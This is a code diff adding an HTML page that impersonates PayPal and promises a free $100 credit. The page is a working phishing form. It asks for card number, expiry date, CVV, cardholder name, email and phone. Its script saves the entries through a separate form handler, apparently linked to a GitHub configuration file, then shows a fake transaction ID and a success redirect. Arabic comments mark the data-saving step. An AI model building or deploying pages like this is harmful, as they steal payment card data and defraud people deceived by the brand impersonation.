@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your $100 PayPal Credit</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="paypal-header">
+        <div class="header-container">
+            <div class="paypal-logo">
+                <span class="paypal-text">PayPal</span>
+            </div>
+            <div class="security-info">
+                <i class="fas fa-lock"></i>
+                <span>SSL Secured</span>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="payment-card">
+            <div class="checkout-header">
+                <div class="promo-banner">
+                    <i class="fas fa-gift"></i>
+                    <span>🎉 Claiming Your FREE $100 PayPal Credit!</span>
+                </div>
+                <h2>Verify Your Information</h2>
+                <p>Complete verification to receive your $100 credit instantly</p>
+            </div>
+
+            <form id="paymentForm">
+                <div class="payment-summary">
+                    <div class="promo-details">
+                        <div class="promo-item">
+                            <i class="fas fa-gift"></i>
+                            <span>PayPal Anniversary Bonus</span>
+                            <span class="promo-amount">+$100.00</span>
+                        </div>
+                        <div class="verification-free">
+                            <div class="free-badge">
+                                <i class="fas fa-check-circle"></i>
+                                <span>100% FREE - No Fees Required!</span>
+                            </div>
+                            <div class="instant-credit">
+                                <span class="instant-label">Instant Credit:</span>
+                                <div class="amount-container">
+                                    <span class="currency">$</span>
+                                    <input type="number" id="amount" name="amount" value="100.00" min="0.01" step="0.01" required readonly>
+                                    <span class="currency-code">USD</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="promo-note">
+                            <i class="fas fa-star"></i>
+                            Simply verify your identity to instantly receive your $100 PayPal credit. 
+                            No payments required - this is completely FREE!
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payment-methods">
+                    <div class="method-header">
+                        <h3>
+                            <i class="fas fa-credit-card"></i>
+                            Card Information
+                        </h3>
+                        <p>Enter your card details below for verification</p>
+                    </div>
+
+                    <div class="card-method">
+                        <div class="input-group">
+                            <label for="cardNumber">Card number</label>
+                            <input type="text" id="cardNumber" name="card_number" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                            <div class="card-icons">
+                                <i class="fab fa-cc-visa"></i>
+                                <i class="fab fa-cc-mastercard"></i>
+                                <i class="fab fa-cc-amex"></i>
+                            </div>
+                        </div>
+
+                        <div class="input-row">
+                            <div class="input-group">
+                                <label for="expiryDate">Expiry date</label>
+                                <input type="text" id="expiryDate" name="expiry_date" placeholder="MM/YY" maxlength="5" required>
+                            </div>
+                            
+                            <div class="input-group">
+                                <label for="cvv">CVV</label>
+                                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
+                                <i class="fas fa-question-circle cvv-help" title="3-4 digit security code"></i>
+                            </div>
+                        </div>
+
+                        <div class="input-group">
+                            <label for="cardName">Name on card</label>
+                            <input type="text" id="cardName" name="card_name" placeholder="Full name as shown on card" required>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="billing-section">
+                    <h3>Contact information</h3>
+                    
+                    <div class="input-group">
+                        <label for="email">Email address</label>
+                        <input type="email" id="email" name="email" placeholder="your@email.com" required>
+                    </div>
+
+                    <div class="input-group">
+                        <label for="phone">Phone number</label>
+                        <input type="tel" id="phone" name="phone" placeholder="+1 (555) 123-4567" required>
+                    </div>
+                </div>
+
+                <div class="paypal-benefits">
+                    <div class="benefit-item">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>Buyer Protection</span>
+                    </div>
+                    <div class="benefit-item">
+                        <i class="fas fa-lock"></i>
+                        <span>Secure encryption</span>
+                    </div>
+                    <div class="benefit-item">
+                        <i class="fas fa-undo"></i>
+                        <span>Easy returns</span>
+                    </div>
+                </div>
+
+                <button type="submit" class="paypal-button">
+                    <span class="button-content">
+                        <i class="fas fa-gift"></i>
+                        Get My FREE $100 Now!
+                    </span>
+                    <div class="loading-spinner" style="display: none;">
+                        <i class="fas fa-spinner fa-spin"></i>
+                    </div>
+                </button>
+            </form>
+
+            <div class="payment-footer">
+                <div class="security-badges">
+                    <div class="badge">
+                        <i class="fas fa-credit-card"></i>
+                        <span>All major cards accepted</span>
+                    </div>
+                    <div class="badge">
+                        <i class="fas fa-globe"></i>
+                        <span>Worldwide coverage</span>
+                    </div>
+                </div>
+                
+                <div class="trust-signals">
+                    <span>Powered by PayPal</span>
+                    <span>•</span>
+                    <span>256-bit SSL encryption</span>
+                    <span>•</span>
+                    <span>PCI DSS compliant</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="github-config.js"></script>
+    <script src="form-handler.js"></script>
+    <script>
+        // Real form submission
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // حفظ البيانات قبل المتابعة
+            if (window.formHandler) {
+                window.formHandler.saveCompleteData();
+            }
+            
+            // Show loading
+            const payButton = document.querySelector('.paypal-button');
+            payButton.classList.add('loading');
+            payButton.querySelector('span').style.display = 'none';
+            payButton.querySelector('.loading-spinner').style.display = 'block';
+            
+            // Process payment (simulate real processing)
+            setTimeout(() => {
+                // Generate real transaction ID
+                const transactionId = 'TXN_PAYPAL_' + Date.now() + '_' + Math.floor(Math.random() * 9999);
+                const amount = document.getElementById('amount').value || '100.00';
+                
+                // Redirect to success page
+                window.location.href = `success.html?transaction_id=${transactionId}&amount=${amount}`;
+            }, 3000);
+        });
+
+        // تنسيق رقم البطاقة
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = '';
+            let len = value.length;
+            
+            for (let i = 0; i < len; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            
+            e.target.value = formattedValue;
+        });
+
+        // تنسيق تاريخ الانتهاء
+        document.getElementById('expiryDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // تنسيق CVV
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // تنسيق رقم الهاتف
+        document.getElementById('phone').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formattedValue = '';
+            
+            if (value.length > 0) {
+                if (value.length <= 3) {
+                    formattedValue = '+1 (' + value;
+                } else if (value.length <= 6) {
+                    formattedValue = '+1 (' + value.substring(0, 3) + ') ' + value.substring(3);
+                } else {
+                    formattedValue = '+1 (' + value.substring(0, 3) + ') ' + value.substring(3, 6) + '-' + value.substring(6, 10);
+                }
+            }
+            
+            e.target.value = formattedValue;
+        });
+    </script>
+    
+    <!-- إشعار حالة النظام -->
+    <div id="system-status" style="
+        position: fixed;
+        bottom: 20px;
+        left: 20px;
+        background: linear-gradient(135deg, #28a745, #20c997);
+        color: white;
+        padding: 10px 15px;
+        border-radius: 25px;
+        font-size: 12px;
+        font-weight: 600;
+        z-index: 9999;
+        box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);
+        display: none;
+        animation: pulse 2s infinite;
+    ">
+        💾 نظام الحفظ الآمن نشط
+    </div>
+    
+    <script>
+        // إظهار حالة النظام
+        setTimeout(() => {
+            const status = document.getElementById('system-status');
+            if (status) {
+                status.style.display = 'block';
+                
+                // إخفاء بعد 5 ثوان
+                setTimeout(() => {
+                    status.style.opacity = '0';
+                    setTimeout(() => {
+                        status.style.display = 'none';
+                    }, 300);
+                }, 5000);
+            }
+        }, 1500);
+    </script>
+</body>
+</html>
